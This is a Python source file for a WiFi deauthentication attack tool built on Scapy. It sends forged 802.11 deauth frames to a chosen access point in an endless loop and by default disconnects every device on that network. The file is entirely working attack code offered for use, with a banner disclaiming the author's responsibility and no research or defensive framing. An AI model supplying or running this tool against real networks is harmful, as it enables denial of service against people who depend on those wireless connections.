from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from os import system, geteuid
import colorama
import argparse
colorama.init(autoreset=True)


logo = f"""
[!!]The author is not responsible for your actions
{colorama.Fore.LIGHTGREEN_EX}WW      WW iii  fff iii {colorama.Fore.RED}DDDDD                          tt    hh     
{colorama.Fore.LIGHTGREEN_EX}WW      WW     ff       {colorama.Fore.RED}DD  DD    eee    aa aa uu   uu tt    hh     
{colorama.Fore.LIGHTGREEN_EX}WW   W  WW iii ffff iii {colorama.Fore.RED}DD   DD ee   e  aa aaa uu   uu tttt  hhhhhh 
{colorama.Fore.LIGHTGREEN_EX} WW WWW WW iii ff   iii {colorama.Fore.RED}DD   DD eeeee  aa  aaa uu   uu tt    hh   hh
{colorama.Fore.LIGHTGREEN_EX}  WW   WW  iii ff   iii {colorama.Fore.RED}DDDDDD   eeeee  aaa aa  uuuu u  tttt hh   hh
	{colorama.Fore.LIGHTBLUE_EX}MADE BY XSARZ     [https://linktr.ee/xsarz]
"""



class WIFIDeauth:




	def send_deauth(self, ap_mac: str, iface: str, target_mac: str = "ff:ff:ff:ff:ff:ff"):
		deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
		try:sendp(deauth_packet, loop=1, iface=iface, inter=0.3, verbose=False)
		except Exception as e:
			print(f'{colorama.Fore.RED}Error: {e}')



	def arg_parse(self):
		parser = argparse.ArgumentParser(description="Make sure that the adapter you specified exists and is entered into monitoring mode.")
		parser.add_argument("-i", dest="interface", required=True, type=str, help="Wifi adapter (interface) in monitoring mode")
		parser.add_argument("-mac", dest="mac", required=True, type=str, help="Access point mac address")
		parser.add_argument("-t", dest="target",  type=str, help="Target mac address of attack (by default all devices on the network)", default="ff:ff:ff:ff:ff:ff")
		args = parser.parse_args()
		return args
		
	def start(self, interface: str, ap_mac: str, target: str):
		print(f"Interface: {colorama.Fore.GREEN}{interface}{colorama.Fore.RESET}\nAccess points: {colorama.Fore.GREEN}{ap_mac}{colorama.Fore.RESET}\nTarget mac: {colorama.Fore.LIGHTYELLOW_EX}{target}{colorama.Fore.GREEN}\nDeauthenticator started")
		self.send_deauth(ap_mac, interface, target)



	def run(self):
		system("clear || cls")
		print(logo)
		if geteuid() != 0:
			print(f"{colorama.Fore.RED}[!!]Start it as root.")
			exit()
		
		result = self.arg_parse()
		self.start(interface=result.interface, ap_mac=result.mac, target=result.target)



if __name__ == "__main__":
	WIFIDeauth().run()
	
